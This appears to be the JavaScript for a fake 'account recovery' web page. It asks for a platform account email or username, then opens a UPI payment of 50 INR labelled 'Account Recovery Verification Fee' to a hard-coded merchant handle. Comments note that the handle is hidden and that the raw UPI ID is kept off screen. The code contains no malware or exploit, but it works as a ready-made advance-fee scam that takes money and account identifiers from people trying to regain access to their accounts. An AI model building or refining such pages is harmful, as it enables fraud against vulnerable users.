let selectedPlatformName = '';
const MERCHANT_UPI = '7463893747@ptyes'; // Hidden/default merchant handle

function goToScreen(screenId) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
    window.scrollTo(0, 0);
}

function selectPlatform(platform) {
    selectedPlatformName = platform;
    document.getElementById('platform-title').textContent = `Enter ${platform} ID`;
    document.getElementById('email-input').placeholder = platform.includes('Email') ? 'name@gmail.com' : 'username or email';
    goToScreen('screen-email');
}

function handleNext(event) {
    event.preventDefault();
    const email = document.getElementById('email-input').value.trim();
    if (!email) return;
    goToScreen('screen-payment');
}

function payViaUPI() {
    const amount = '50.00';
    const note = encodeURIComponent('Account Recovery Verification Fee');
    // Opens PhonePe / UPI intent without displaying the raw UPI ID directly to avoid clutter
    const upiUrl = `upi://pay?pa=${MERCHANT_UPI}&pn=AccountRecovery&am=${amount}&cu=INR&tn=${note}`;
    
    window.location.href = upiUrl;
}
